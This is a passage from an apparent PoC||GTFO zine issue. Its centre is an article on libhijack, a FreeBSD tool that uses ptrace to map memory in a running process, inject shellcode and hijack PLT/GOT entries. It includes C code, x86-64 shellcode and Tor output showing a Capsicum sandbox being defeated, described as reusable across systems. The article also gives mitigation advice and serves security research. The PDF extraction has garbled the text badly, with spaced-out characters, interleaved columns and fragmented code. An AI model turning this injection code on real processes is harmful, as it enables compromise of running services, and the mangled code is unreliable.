an Adafruit FTDI Friend, which is a standard FTDI
FT232R-based USB-to-serial adapter. The FTDI
Friend also provides 5V (VDD) to the PoC.
In normal operation, the device will look for a
key press on GP4 from the FTDI Friend’s TX pin
and then repeatedly transmit the character ’A’ at
9600 baud via GP0 to the FTDI Friend’s RX pin.
When the device is rotated 180 degrees, the device
will look for a key press on GP0 and repeatedly
transmit the character ’B’ on GP4. As a key press
detector, instead of reading a full character from the
host, the device just looks for a high-to-low transi-
tion on the PIC’s currently configured RX pin. Since
that pin idles high, the start bit of any data sent
from the FTDI Friend will be logic low.
32Adafruit FTDI Friend Interface
COU1
U1
PIC12F629-I/P
VDD
COR2
R2
PIR201
1
PIU101
10k
VDD
VSS
COP1
P1
8
Header 6
PIU108
PIP101
2
PIR202
PIU102
7
GP5 GP0/ICSPDAT PIU107
GP4 GP1/ICSPCLK PIU106
PIR101
PIP102
PIP103
3
PIU103
6
COR1
R1 10k
PIR102
VDD
PIP104
VDD
PIC102
4
PIU104
GP3/MCLR
GP2
5
PIU105
VDD
0.1uF
while ( 1 ) {
p r i n t f ( "A " ) ;
delay_ms ( 1 0 ) ;
}
break ;
10
12
14
PIC101
case MODE_ALTERNATE: // abnormal b e h a v i o r
#u s e r s 2 3 2 ( baud =9600 , b i t s =8 , p a r i t y=N,
s t o p =1 , xmit=PIN_A4 , force_sw )
16
// w a i t f o r a k e y p r e s s
while ( i n p u t (PIN_A0) ) ;
18
20
while ( 1 ) {
p r i n t f ( "B " ) ;
delay_ms ( 1 0 ) ;
}
break ;
22
24
}
For your viewing entertainment, a demonstra-
tion of my breadboard prototype can be found on
Youtube. 17 Complete engineering documentation,
including schematic, bill-of-materials, source code,
and layout for a small circuit board module are also
available. 18
17 Joe
RTS <-
RX ->
TX <-
VCC <-
CTS ->
GND
Let this PoC serve as a reminder that one should
not take anything at face value. There are an end-
less number of ways that hardware, and the elec-
tronic components within a hardware system, can
misbehave. Hopefully, this little trick will inspire
future hardware mischief and/or the development of
other sneaky circuits. If nothing else, you’re at least
armed with a snarky response for the next time some
over-confident engineer insists ICs will only work in
one direction!
switch ( i n p u t (PIN_A1) ) { // o r i e n t a t i o n
detection
2
case MODE_NORMAL: // normal b e h a v i o r
#u s e r s 2 3 2 ( baud =9600 , b i t s =8 , p a r i t y=N,
s t o p =1 , xmit=PIN_A0 , force_sw )
4
// w a i t f o r a k e y p r e s s
6
while ( i n p u t (PIN_A4) ) ;
8
PIP105
PIP106
COC1
C1
1
2
3
4
5
6
Grand, Sneaky Circuit: This DIP Goes Both Ways
pocorgtfo17.pdf dipflip.zip # or at www.grandideastudio.com/portfolio/sneaky-circuits/
18 unzip
3317:07
Injecting shared objects on FreeBSD with libhijack.
by Shawn Webb
In the land of red devils known as Beasties exists
a system devoid of meaningful exploit mitigations.
As we explore this vast land of opportunity, we will
meet our ELFish friends, [p]tracing their very moves
in order to hijack them. Since unprivileged process
debugging is enabled by default on FreeBSD, we can
abuse ptrace to create anonymous memory map-
pings, inject code into them, and overwrite PLT/-
GOT entries. 19 We will revive a tool called libhijack
to make our nefarious activities of hijacking ELFs
via ptrace relatively easy.
Nothing presented here is technically new. How-
ever, this type of work has not been documented
in this much detail, so here I am, tying it all into
one cohesive work. In Phrack 56:7, Silvio Cesare
taught us fellow ELF research enthusiasts how to
hook the PLT/GOT. 20 Phrack 59:8, on Runtime
Process Infection, briefly introduces the concept of
injecting shared objects by injecting shellcode via
ptrace that calls dlopen(). 21 No other piece of re-
search, however, has discovered the joys of forcing
the application to create anonymous memory map-
pings from which to inject code.
This is only part one of a series of planned ar-
ticles that will follow libhijack’s development. The
end goal is to be able to anonymously inject shared
objects. The libhijack project is maintained by the
SoldierX community.
doesn’t use RELRO, and even if FreeBSD did, us-
ing ptrace to do devious things negates RELRO as
ptrace gives us God-like capabilities. We will see
the strength of PaX NOEXEC in HardenedBSD,
preventing PLT/GOT redirections and executable
code injections.
The Role of ELF
FreeBSD provides a nifty API for inspecting the en-
tire virtual memory space of an application. The
results returned from the API tells us the protec-
tion flags of each mapping (readable, writable, exe-
cutable.) If FreeBSD provides such a rich API, why
would we need to parse the ELF headers?
We want to ensure that we find the address of the
system call instruction in a valid memory location. 22
On ARM64, we also need to keep the alignment to
eight bytes. If the execution is redirected to an im-
properly aligned instruction, the CPU will abort the
application with SIGBUS or SIGKILL. Intel-based
architectures do not care about instruction align-
ment, of course.
PLT/GOT hijacking requires parsing ELF head-
ers. One would not be able to find the PLT/GOT
without iterating through the Process Headers to
find the Dynamic Headers, eventually ending up
with the DT_PLTGOT entry.
Previous Research
We make heavy use of the Struct_Obj_Entry
structure, which is the second PLT/GOT entry. In-
deed, in a future version of libhijack, we will likely
handcraft our own Struct_Obj_Entry object and
insert that into the real RTLD in order to allow the
shared object to resolve symbols via normal meth-
ods.
All prior work injects code into the stack, the heap,
or existing executable code. All three methods cre-
ate issues on today’s systems. On AMD64 and
ARM64, the two architectures libhijack cares about,
the stack is non-executable by default. The heap
implementation on FreeBSD, jemalloc creates non-
executable mappings. Obviously overwriting exist-
ing executable code destroys a part of the executable
image.
PLT/GOT redirection attacks have proven ex-
tremely useful, so much so that read-only relocations
(RELRO) is a standard mitigation on hardened sys-
tems. Thankfully for us as attackers, FreeBSD
Thus, invoking ELF early on through the pro-
cess works to our advantage. With FreeBSD’s
libprocstat API, we don’t have a need for parsing
ELF headers until we get to the PLT/GOT stage,
but doing so early makes it easier for the attacker
using libhijack, which does all the heavy lifting.
19 Procedure
Linkage Table/Global Offset Table
pocorgtfo17.pdf phrack56-7.txt
21 unzip pocorgtfo17.pdf phrack59-8.txt
22 syscall on AMD64, svc 0 on ARM64.
20 unzip
34Finding the Base Address
Executables come in two flavors:
Position-
Independent Executables (PIEs) and regular ones.
Since FreeBSD does not have any form of address
space randomization (ASR or ASLR), it doesn’t ship
any application built in PIE format.
Because the base address of an application can
change depending on: architecture, compiler/linker
flags, and PIE status, libhijack needs to find a way to
determine the base address of the executable. The
base address contains the main ELF headers.
libhijack uses the libprocstat API to find the
base address. AMD64 loads PIE executables to
0x01021000 and non-PIE executables to a base ad-
dress of 0x00200000. ARM64 uses 0x00100000 and
0x00100000, respectively.
libhijack will loop through all the memory map-
pings as returned by the libprocstat API. Only
the first page of each mapping is read in–enough
to check for ELF headers. If the ELF headers are
found, then libhijack assumes that the first ELF ob-
ject is that of the application.
1 i n t r e s o l v e _ b a s e _ a d d r e s s (HIJACK ∗ h i j a c k ) {
struct p r o c s t a t ∗ ps ;
3
struct k i n f o _ p r o c ∗p=NULL;
struct kinfo_vmentry ∗vm=NULL;
5
unsigned i n t i , c n t =0;
i n t e r r=ERROR_NONE;
7
ElfW ( Ehdr ) ∗ ehdr ;
9
11
13
15
17
19
ps = p r o c s t a t _ o p e n _ s y s c t l ( ) ;
i f ( ps == NULL) {
S e t E r r o r ( h i j a c k , ERROR_SYSCALL) ;
return ( −1) ;
}
p = p r o c s t a t _ g e t p r o c s ( ps , KERN_PROC_PID,
h i j a c k −>pid , &c n t ) ;
i f ( c n t == 0 ) {
e r r = ERROR_SYSCALL;
goto e r r o r ;
}
21
23
25
27
29
31
cnt = 0 ;
vm = procstat_getvmmap ( ps , p , &c n t ) ;
i f ( c n t == 0 ) {
e r r = ERROR_SYSCALL;
goto e r r o r ;
}
f o r ( i = 0 ; i < c n t ; i ++) {
i f (vm [ i ] . kve_type != KVME_TYPE_VNODE)
continue ;
33
ehdr = read_data ( h i j a c k ,
( unsigned long ) (vm [ i ] . k v e _ s t a r t ) ,
getpagesize () ) ;
i f ( ehdr == NULL) {
goto e r r o r ;
}
i f ( IS_ELF ( ∗ ehdr ) ) {
h i j a c k −>b a s e a d d r =
( unsigned long ) (vm [ i ] . k v e _ s t a r t ) ;
break ;
}
f r e e ( ehdr ) ;
35
37
39
41
43
45 }
47 i f ( h i j a c k −>b a s e a d d r == NULL)
e r r = ERROR_NEEDED;
49
error :
i f (vm != NULL)
procstat_freevmmap ( ps , vm) ;
53
i f ( p != NULL)
p r o c s t a t _ f r e e p r o c s ( ps , p ) ;
55
p r o c s t a t _ c l o s e ( ps ) ;
return ( e r r ) ;
57 }
51
35Assuming that the first ELF object is the appli-
cation itself, though, can fail in some corner cases,
such as when the RTLD (the dynamic linker) is used
to execute the application. For example, instead of
calling /bin/ls directly, the user may instead call
/libexec/ld-elf.so.1 /bin/ls. Doing so causes
libhijack to not find the PLT/GOT and fail early
sanity checks. This can be worked around by pro-
viding the base address instead of attempting auto-
detection.
The RTLD in FreeBSD only recently gained the
ability to execute applications directly. Thus, the
assumption that the first ELF object is the applica-
tion is generally safe to make.
This algorithm is implemented using a series of
callbacks, to encourage an internal API that is flex-
ible and scalable to different situations.
Creating a new memory mapping
Now that we found the system call, we can force
the application to call mmap. AMD64 and ARM64
have slightly different approaches to calling mmap.
On AMD64, we simply set the registers, including
the instruction pointer to their respective values.
On ARM64, we must wait until the application at-
tempts to call a system call, then set the registers
to their respective values.
Finally, in both cases, we continue execution,
waiting for mmap to finish. Once it finishes, we
should have our new mapping. It will store the
start address of the new memory mapping in rax on
AMD64 and x0 on ARM64. We save this address,
restore the registers back to their previous values,
and return the address back to the user.
The following is handy dandy table of calling
conventions.
Finding the syscall
As mentioned above, we want to ensure with 100%
certainty we’re calling into the kernel from an ex-
ecutable memory mapping and in an allowed loca-
tion. The ELF headers tell us all the publicly acces-
sible functions loaded by a given ELF object.
The application itself might never call into the
kernel directly. Instead, it will rely on shared li-
braries to do that. For example, reading data from a
file descriptor is a privileged operation that requires
help from the kernel. The read() libc function calls
the read syscall.
libhijack iterates through the ELF headers, fol-
lowing this pseudocode algorithm:
Arch
AMD64
• Locate the first Obj_Entry structure, a linked
list that describes loaded shared object.
aarch64
• Iterate through the symbol table for the
shared object:
– If the symbol is not a function, continue
to the next symbol or break out if no
more symbols.
– Read the symbol’s payload into memory.
Scan it for the syscall opcode, respect-
ing instruction alignment.
– If the instruction alignment is off, con-
tinue scanning the function.
– If the syscall opcode is found and the
instruction alignment requirements are
met, return the address of the system
call.
• Repeat the iteration with the next Obj_Entry
linked list node.
36
Register
rax
rdi
rsi
rdx
r10
r8
r9
x0
x1
x2
x3
x4
x5
x6
x8
Value
syscall number
addr
length
prot
flags
fd (-1)
offset (0)
syscall number
addr
length
prot
flags
fd (-1)
offset (0)
terminator1
void
3
5
f r e e b s d _ p a r s e _ s o e ( HIJACK ∗ h i j a c k , s t r u c t
i n t e r r =0;
ElfW ( Sym ) ∗ l i b s y m=NULL ;
unsigned long numsyms , symaddr =0 , i =0;
char ∗name ;
Struct_Obj_Entry ∗ s o e ,
linkmap_callback
callback )
{
numsyms = s o e − >n c h a i n s ;
symaddr = ( unsigned long ) ( s o e − >symtab ) ;
7
9
do{
11
if
( ( libsym ) )
f r e e ( libsym ) ;
13
l i b s y m = ( ElfW ( Sym ) ∗ ) r e a d _ d a t a ( h i j a c k ,
i f ( ! ( libsym ) ) {
e r r = GetErrorCode ( h i j a c k ) ;
goto n o t f o u n d ;
}
15
17
( unsigned long ) symaddr ,
s i z e o f ( ElfW ( Sym ) ) ) ;
19
if
21
(ELF64_ST_TYPE( l i b s y m − >s t _ i n f o )
symaddr += s i z e o f ( ElfW ( Sym ) ) ;
continue ;
!= STT_FUNC)
{
23 }
25 name = r e a d _ s t r ( h i j a c k , ( unsigned long ) ( s o e − >s t r t a b + l i b s y m − >st_name ) ) ;
i f ( ( name ) ) {
i f ( c a l l b a c k ( h i j a c k , s o e , name , ( ( unsigned long ) ( s o e − >mapbase ) + l i b s y m − >s t _ v a l u e ) ,
( s i z e _ t ) ( l i b s y m − >s t _ s i z e ) ) != CONTPROC) {
f r e e ( name ) ;
break ;
}
27
29
31
33
f r e e ( name ) ;
}
35
symaddr += s i z e o f ( ElfW ( Sym ) ) ;
} w h i le ( i++ < numsyms ) ;
37
39 notfound :
SetError ( hijack ,
41 }
err ) ;
43 CBRESULT s y s c a l l _ c a l l b a c k ( HIJACK ∗ h i j a c k , void ∗ l i n k m a p , char ∗name , unsigned long vaddr , s i z e _ t
unsigned long s y s c a l l a d d r ;
45
unsigned i n t a l i g n ;
size_t l e f t ;
47
align = GetInstructionAlignment () ;
49
l e f t = sz ;
w h i le ( l e f t > s i z e o f (SYSCALLSEARCH) − 1 ) {
51
s y s c a l l a d d r = search_mem ( h i j a c k , vaddr , l e f t , SYSCALLSEARCH, s i z e o f (SYSCALLSEARCH) −1) ;
i f ( s y s c a l l a d d r == ( unsigned long )NULL)
53
break ;
55
if
57
( ( s y s c a l l a d d r % a l i g n ) == 0 ) {
h i j a c k − >s y s c a l l a d d r = s y s c a l l a d d r ;
return TERMPROC;
}
59
l e f t −= ( s y s c a l l a d d r − v a d d r ) ;
v a d d r += ( s y s c a l l a d d r − v a d d r ) + s i z e o f (SYSCALLSEARCH) −1;
61
}
63
return CONTPROC;
65 }
67 i n t L o c a t e S y s t e m C a l l ( HIJACK ∗ h i j a c k )
Obj_Entry ∗ s o e , ∗ n e x t ;
{
69
if ( I s A t t a c h e d ( h i j a c k ) == f a l s e )
return ( S e t E r r o r ( h i j a c k , ERROR_NOTATTACHED) ) ;
if ( I s F l a g S e t ( h i j a c k , F_DEBUG) )
f p r i n t f ( s t d e r r , " [ ∗ ] Looking f o r
71
73
s y s c a l l \n" ) ;
75
87 s o e = h i j a c k − >s o e ;
do {
freebsd_parse_soe ( h i j a c k , soe , s y s c a l l _ c a l l b a c k ) ;
n e x t = TAILQ_NEXT( s o e , n e x t ) ;
i f ( s o e != h i j a c k − >s o e )
f r e e ( soe ) ;
i f ( h i j a c k − >s y s c a l l a d d r != ( unsigned long )NULL)
break ;
s o e = read_data ( h i j a c k ,
( unsigned long ) n e x t ,
s i z e o f ( ∗ soe ) ) ;
} w h i le ( s o e != NULL) ;
89 if
77
79
81
83
85
91
93 }
95 if
97
99
( h i j a c k − >s y s c a l l a d d r == ( unsigned long )NULL) {
i f ( I s F l a g S e t ( h i j a c k , F_DEBUG) )
f p r i n t f ( s t d e r r , " [ − ] Could n o t f i n d t h e s y s c a l l \ n " ) ;
return ( S e t E r r o r ( h i j a c k , ERROR_NEEDED) ) ;
( I s F l a g S e t ( h i j a c k , F_DEBUG) )
f p r i n t f ( s t d e r r , " [+] s y s c a l l found
h i j a c k − >s y s c a l l a d d r ) ;
return
at
0 x%016 l x \ n " ,
( S e t E r r o r ( h i j a c k , ERROR_NONE) ) ;
}
37
sz )
{Currently, fd and offset are hardcoded to −1
and 0 respectively. The point of libhijack is to use
anonymous memory mappings. When mmap returns,
it will place the start address of the new memory
mapping in rax on AMD64 and x0 on ARM64. The
implementation of md_map_memory for AMD64 looks
like the following:
2
4
6
unsigned long md_map_memory( HIJACK ∗ h i j a c k ,
s t r u c t mmap_arg_struct ∗mmap_args ) {
REGS r e g s _ b a c k u p , ∗ r e g s ;
unsigned long addr , r e t ;
register_t stackp ;
int err , status ;
8
r e t = ( unsigned long )NULL ;
e r r = ERROR_NONE;
10
r e g s = _hijack_malloc ( hijack ,
s i z e o f (REGS) ) ;
12
if
14
16
( p t r a c e (PT_GETREGS,
< 0) {
e r r = ERROR_SYSCALL ;
goto end ;
}
memcpy(& r e g s _ b a c k u p ,
18
20
h i j a c k − >p i d ,
regs ,
( caddr_t ) r e g s ,
0)
s i z e o f (REGS) ) ;
S e t R e g i s t e r ( r e g s , " s y s c a l l " , MMAPSYSCALL) ;
S e t I n s t r u c t i o n P o i n t e r ( r e g s , h i j a c k − >s y s c a l l a d d r ) ;
S e t R e g i s t e r ( r e g s , " a r g 0 " , mmap_args− >a d d r ) ;
S e t R e g i s t e r ( r e g s , " a r g 1 " , mmap_args− >l e n ) ;
S e t R e g i s t e r ( r e g s , " a r g 2 " , mmap_args− >p r o t ) ;
S e t R e g i s t e r ( r e g s , " a r g 3 " , mmap_args− > f l a g s ) ;
S e t R e g i s t e r ( r e g s , " a r g 4 " , −1) ; /∗ f d ∗/
S e t R e g i s t e r ( r e g s , " a r g 5 " , 0 ) ; /∗ o f f s e t ∗/
22
24
26
28
if
30
32
( p t r a c e (PT_SETREGS,
< 0) {
e r r = ERROR_SYSCALL ;
goto end ;
h i j a c k − >p i d ,
( caddr_t ) r e g s ,
0)
}
34
/∗ t i m e t o run mmap ∗/
a d d r = MMAPSYSCALL;
w h i le ( a d d r == MMAPSYSCALL) {
i f ( p t r a c e (PT_STEP, h i j a c k − >p i d , ( c a d d r _ t ) 0 ,
< 0)
e r r = ERROR_SYSCALL ;
do {
w a i t p i d ( h i j a c k − >p i d , &s t a t u s , 0 ) ;
} w h i le ( ! WIFSTOPPED( s t a t u s ) ) ;
36
38
40
42
0)
HardenedBSD, a derivative of FreeBSD, prevents
the creation of memory mappings that are both
writable and executable. If a user attempts to create
a memory mapping that is both writable and exe-
cutable, the execute bit will be dropped. Similarly,
it prevents upgrading a writable memory mapping
to executable with mprotect, critically, it places
these same restrictions on ptrace. As a result, lib-
hijack is completely mitigated in HardenedBSD.
44
p t r a c e (PT_GETREGS, h i j a c k − >p i d , ( c a d d r _ t ) r e g s ,
addr = G e t R e g i s t e r ( r e g s , " r e t " ) ;
46
0) ;
}
48
if
50
52
p t r a c e (PT_SETREGS, h i j a c k − >p i d ,
( c a d d r _ t ) (& r e g s _ b a c k u p ) ,
e r r = ERROR_CHILDERROR;
goto end ;
54
56
58
60
( ( long ) a d d r == −1) {
i f ( I s F l a g S e t ( h i j a c k , F_DEBUG) )
f p r i n t f ( s t d e r r , " [ − ] Could n o t map a d d r e s s .
" C a l l i n g mmap f a i l e d ! \ n " ) ;
"
0) ;
}
end :
if
62
( p t r a c e (PT_SETREGS, h i j a c k − >p i d ,
( c a d d r _ t ) (& r e g s _ b a c k u p ) ,
e r r = ERROR_SYSCALL ;
Hijacking the PLT/GOT
0) < 0)
Now that we have an anonymous memory mapping
we can inject code into, it’s time to look at hijack-
ing the Procedure Linkage Table/Global Offset Ta-
ble. PLT/GOT hijacking only works for symbols
that have been resolved by the RTLD in advance.
Thus, if the function you want to hijack has not
been called, its address will not be in the PLT/GOT
unless BIND_NOW is active.
The application itself contains its own PLT/-
GOT. Each shared object it depends on has its own
PLT/GOT as well. For example, libpcap requires
libc. libpcap calls functions in libc and thus needs
its own linkage table to resolve libc functions at run-
64
if
66
68
( e r r == ERROR_NONE)
r e t = addr ;
free ( regs ) ;
SetError ( hijack ,
return ( r e t ) ;
70
err ) ;
}
Even though we’re going to write to the memory
mapping, the protection level doesn’t need to have
the write flag set. Remember, with ptrace, we’re
gods. It will allow us to write to the memory map-
ping via ptrace, even if that memory mapping is
non-writable.
38time.
This is the reason why parsing the ELF headers,
looking for functions, and for the system call as de-
tailed above works to our advantage. Along the way,
we get to know certain pieces of info, like where the
PLT/GOT is. libhijack will cache that information
along the way.
In order to hijack PLT/GOT entries, we need to
know two pieces of information: the address of the
table entry we want to hijack and the address to
point it to. Luckily, libhijack has an API for resolv-
ing functions and their locations in the PLT/GOT.
Once we have those two pieces of information,
then hijacking the GOT entry is simple and straight-
forward. We just replace the entry in the GOT
with the new address. Ideally, the the injected code
would first stash the original address for later use.
ingful exploit mitigation outside of arguably inef-
fective stack cookies, an attacker can abuse mem-
ory corruption vulnerabilities to use ret2libc style
attacks against wrapper-style capsicumized appli-
cations with 100% reliability. Instead of return-
ing to open, all the attacker needs to do is return
to sandbox_open. Without exploit mitigations like
PaX ASLR, PaX NOEXEC, and/or CFI, the follow-
ing code can be used copy/paste style, allowing for
mass exploitation without payload modification.
To illustrate the need for ASLR and NOEXEC,
we will use libhijack to emulate the exploitation
of a vulnerability that results in a control flow hi-
jack. Note that due using libhijack, we bypass the
forward-edge guarantees CFI gives us. LLVM’s im-
plementation of CFI does not include backward-edge
guarantees. We could gain backward-edge guaran-
tees through SafeStack; however, Tor immediately
crashes when compiled with both CFI and SafeS-
tack.
In Figure 16, we perform the following:
Case Study: Tor Capsicumization
Capsicum is a capabilities framework for FreeBSD.
It’s commonly used to implement application sand-
boxing. HardenedBSD is actively working on inte-
grating Capsicum for Tor. Tor currently supports
a sandboxing methodology that is wholly incompat-
ible with Capsicum. Tor’s sandboxing model uses
seccomp(2), a filtering-based sandbox. When Tor
starts up, Tor tells its sandbox initialization routines
to whitelist certain resources followed by activation
of the sandbox. Tor then can call open(2), stat(2),
etc. as needed on an on-demand basis.
In order to prevent a full rewrite of Tor to
handle Capsicum, HardenedBSD has opted to use
wrappers around privileged function calls, such as
open(2) and stat(2). Thus, open(2) becomes
sandbox_open().
Prior to entering capabilities mode (capmode
for short), Tor will pre-open any directories within
which it expects to open files. Any time Tor ex-
pects to open a file, it will call tt openat rather
than open. Thus, Tor is limited to using files within
the directories it uses. For this reason, we will place
the shared object within Tor’s data directory. This
is not unreasonable, since we either must be root or
running as the same user as the tor daemon in order
to use libhijack against it.
Note that as of the time of this writing, the Cap-
sicum patch to Tor has not landed upstream and is
in a separate repository. 23
Since FreeBSD does not implement any mean-
• We attach to the victim process.
• We create an anonymous memory allocation
with read and execute privileges.
• We write the filename that we’ll pass to
sandbox_open() into the beginning of the al-
location.
• We inject the shellcode into the allocation, just
after the filename.
• We execute the shellcode and detach from the
process
• We call sandbox_open. The address is hard-
coded and can be reused across like systems.
• We save the return value of sandbox_open,
which will be the opened file descriptor.
• We pass the file descriptor to fdopen. The ad-
dress is hard-coded and can be reused on all
similar systems.
• The RTLD loads the shared object, calling any
initialization routines. In this case, a simple
string is printed to the console.
23 https://github.com/lattera/tor/tree/hardening/capsicum
391 /∗ main . c . USAGE: a . o u t <pid > <s h e l l c o d e > <so> ∗/
#define MMAP_HINT
0x4000UL
3
i n t main ( i n t a r g c , char ∗ a r g v [ ] ) {
5
unsigned long addr , p t r ;
HIJACK ∗ c t x = I n i t H i j a c k (F_DEFAULT) ;
7
A s s i g n P i d ( ctx , ( pid_t ) a t o i ( a r g v [ 1 ] ) ) ;
9
11
i f ( Attach ( c t x ) ) {
f p r i n t f ( s t d e r r , " [ −] Could not a t t a c h ! \ n" ) ;
exit (1) ;
}
13
21 LocateSystemCall ( ctx ) ;
addr = MapMemory( ctx , MMAP_HINT, g e t p a g e s i z e ( ) ,
PROT_READ | PROT_EXEC, MAP_FIXED | MAP_ANON | MAP_PRIVATE) ;
i f ( addr == ( unsigned long ) −1) {
f p r i n t f ( s t d e r r , " [ −] Could not map memory ! \ n" ) ;
Detach ( c t x ) ;
exit (1) ;
}
23 p t r = addr ;
25 WriteData ( ctx , addr , a r g v [ 3 ] , s t r l e n ( a r g v [ 3 ] ) +1) ;
p t r += s t r l e n ( a r g v [ 3 ] ) + 1 ;
I n j e c t S h e l l c o d e A n d R u n ( ctx , ptr , a r g v [ 2 ] , t r u e ) ;
15
17
19
27
29
Detach ( c t x ) ;
return ( 0 ) ;
31 }
1 /∗ t e s t s o . c ∗/
__attribute__ ( ( c o n s t r u c t o r ) ) void i n i t ( void ) {
3
p r i n t f ( " This o ut pu t i s from an i n j e c t e d s h a r e d o b j e c t . You have been pwned . \ n" ) ;
}
/∗ s a n d b o x _ f d l o p e n . asm ∗/
2 BITS 64
mov rbp , r s p
4
; Save r e g i s t e r s
6 push r d i
push r s i
8 push rdx
push r c x
10 push r a x
12 ; C a l l sandbox_open
mov r d i , 0 x4000
14 x o r r s i , r s i
x o r rdx , rdx
16 x o r rcx , r c x
mov rax , 0 x 0 0 0 0 0 0 0 0 0 1 1 c 4 0 7 0 ; sandbox_open
18 c a l l r a x
20 ; C a l l f d l o p e n
mov r d i , r a x
22 mov r s i , 0 x101
mov rax , 0 x8 014 c367 0
24 c a l l r a x
26 ; R e s t o r e r e g i s t e r s
pop r a x
28 pop r c x
pop rdx
30 pop r s i
pop r d i
32
mov rsp , rbp
34 r e t
Figure 16
40
; fdlopen2
4
6
8
10
12
14
16
18
20
Oct 04 1 8 : 5 9 : 2 5 . 9 7 6 [ n o t i c e ] Tor 0 . 3 . 2 . 2 − a l p h a r u n n i n g on FreeBSD with L i b e v e n t
2 . 1 . 8 − s t a b l e , OpenSSL 1 . 0 . 2 k−f r e e b s d , Z l i b 1 . 2 . 1 1 , Liblzma N/A,
and L i b z s t d N/A.
Oct 04 1 8 : 5 9 : 2 5 . 9 7 6 [ n o t i c e ] Tor can ’ t h e l p you i f you u s e i t wrong ! Learn how t o be s a f e a t
h t t p s : / /www. t o r p r o j e c t . o r g / download / download#warning
Oct 04 1 8 : 5 9 : 2 5 . 9 7 6 [ n o t i c e ] This v e r s i o n i s not a s t a b l e Tor r e l e a s e . Expect more bugs than
usual .
Oct 04 1 8 : 5 9 : 2 5 . 9 7 7 [ n o t i c e ] Read c o n f i g u r a t i o n f i l e "/home/ shawn / i n s t a l l s / e t c / t o r / t o r r c " .
Oct 04 1 8 : 5 9 : 2 5 . 9 8 2 [ n o t i c e ] S c h e d u l e r t y p e KISTLite has been e n a b l e d .
Oct 04 1 8 : 5 9 : 2 5 . 9 8 2 [ n o t i c e ] Opening S o c k s l i s t e n e r on 1 2 7 . 0 . 0 . 1 : 9 0 5 0
Oct 04 1 8 : 5 9 : 2 5 . 0 0 0 [ n o t i c e ] P a r s i n g GEOIP IPv4 f i l e /home/ shawn / i n s t a l l s / s h a r e / t o r / g e o i p .
Oct 04 1 8 : 5 9 : 2 6 . 0 0 0 [ n o t i c e ] P a r s i n g GEOIP IPv6 f i l e /home/ shawn / i n s t a l l s / s h a r e / t o r / g e o i p 6 .
Oct 04 1 8 : 5 9 : 2 6 . 0 0 0 [ n o t i c e ] B o o t s t r a p p e d 0%: S t a r t i n g
Oct 04 1 8 : 5 9 : 2 7 . 0 0 0 [ n o t i c e ] S t a r t i n g with guard c o n t e x t " d e f a u l t "
Oct 04 1 8 : 5 9 : 2 7 . 0 0 0 [ n o t i c e ] B o o t s t r a p p e d 80%: C o n n e c t i n g t o t h e Tor network
Oct 04 1 8 : 5 9 : 2 8 . 0 0 0 [ n o t i c e ] B o o t s t r a p p e d 85%: F i n i s h i n g handshake with f i r s t hop
Oct 04 1 8 : 5 9 : 2 9 . 0 0 0 [ n o t i c e ] B o o t s t r a p p e d 90%: E s t a b l i s h i n g a Tor c i r c u i t
Oct 04 1 8 : 5 9 : 3 1 . 0 0 0 [ n o t i c e ] Tor has s u c c e s s f u l l y opened a c i r c u i t . Looks l i k e c l i e n t
f u n c t i o n a l i t y i s working .
Oct 04 1 8 : 5 9 : 3 1 . 0 0 0 [ n o t i c e ] B o o t s t r a p p e d 100%: Done
This o ut pu t i s from an i n j e c t e d s h a r e d o b j e c t . You have been pwned .
Figure 17. Output from Tor.
The Future of libhijack Conclusion
Writing devious code in assembly is cumbersome.
Assembly doesn’t scale well to multiple architec-
tures. Instead, we would like to write our devious
code in C, compiling to a shared object that gets in-
jected anonymously. Writing a remote RTLD within
libhijack is in progress, but it will take a while as this
is not an easy task.
Additionally, creation of a general-purpose
helper library that gets injected would be useful.
It could aid in PLT/GOT redirection attacks, pos-
sibly storing the addresses of functions we’ve pre-
viously hijacked. This work is dependent on the
remote RTLD.
Once the ABI and API stabilize, formal docu-
mentation for libhijack will be written. Using libhijack, we can easily create anonymous
memory mappings, inject into them arbitrary code,
and hijack the PLT/GOT on FreeBSD. On Hard-
enedBSD, a hardened derivative of FreeBSD, out
tool is fully mitigated through PaX’s NOEXEC.
We’ve demonstrated that wrapper-style Cap-
sicum is ineffective on FreeBSD. Through the use of
libhijack, we emulate a control flow hijack in which
the application is forced to call sandbox_open and
fdlopen(3) on the resulting file descriptor.
Further work to support anonymous injection of
full shared objects, along with their dependencies,
will be supported in the future. Imagine injecting
libpcap into Apache to sniff traffic whenever “GET
/pcap” is sent.
FreeBSD system administrators should set
security.bsd.unprivileged_proc_debug to 0 to
prevent abuse of ptrace. To prevent process ma-
nipulation, FreeBSD developers should implement
PaX NOEXEC.
Source code is available. 24
24 git
clone https://github.com/SoldierX/libhijack || unzip pocorgtfo17.pdf libhijack.zip
4117:08
Murder on the USS Table
by Soldier of Fortran
concerning an adventure with Bigendian Smalls
The following is a dramatization of how I learned
1
/\_/\____,
to write assembler, deal with mainframe forums, and
,___/\_/\ \ ~
/
make kick-ass VTAM USS Tables. Names have been 3
\
~ \ )
XXX
XXX
/
/\_/\___,
fabricated, and I won’t let the truth get in the way
5
\o−o/−o−o /
~
/
of a good story, but the information is real.
) /
\
XXX
It was about eleven o’clock in the evening, early 7
_|
/ \ \_/
,−/
_ \_/
\
summer, with the new moon leaving an inky dark-
/ (
/____,__|
)
ness on the streets. The kids were in bed dreaming 9
(
|_ (
) \ ) _|
of sweet things while I was nursing a cheap bour- 11
_/ _)
\
\__/
(_
bon at the kitchen table. Dressed in an old t-shirt
( , − ( ,( ,( ,/
\ ,) ,) ,)
h t t p : / / c e r b e r u s . a s c i i . uk/
reminding me of better days, and cheap polyester 13
pants, I was getting ready to call it a night when I
saw trouble. Trouble has a name, Bigendian Smalls.
A tall, blonde, drink of water who knows more about
The rest, however would require a friend’s pre-
mainframe hacking than anyone else on the planet,
vious work, as well as a deep understanding of the
with a penchant for cargo shorts. I could never say
TN3270 protocol and mainframe assembler.
no to cargo shorts.
–——–
———
—–—–
When I got in to this game six years ago it was
The notification pinged my phone before it made
because I was tired of looking at the red “Z.”
it to Chrome. I knew, right then and there I wasn’t
calling it a night. Biggie needed something, and he
needed it sooner rather than later. One thing you
should know about me, I’m no sucker, but when a
friend is in need I jump at the chance to lend a hand.
Before opening the message, I poured myself an-
other glass. The sound of the cheap, room temper-
ature bourbon cracking the ice broke the silence in
my small kitchen, like an e-sport pro cracking her
knuckles before a match. I opened the message:
“Hey, I need your help. Can you make a main-
frame logon screen for Kerberos? But can you add
that stupid Windows 10 upgrade popup when some-
one hits enter?”
That red was rough, as though accessing this
“Yeah,” I replied. I’m not known for much. I
mainframe was going to lead me right to Satan him-
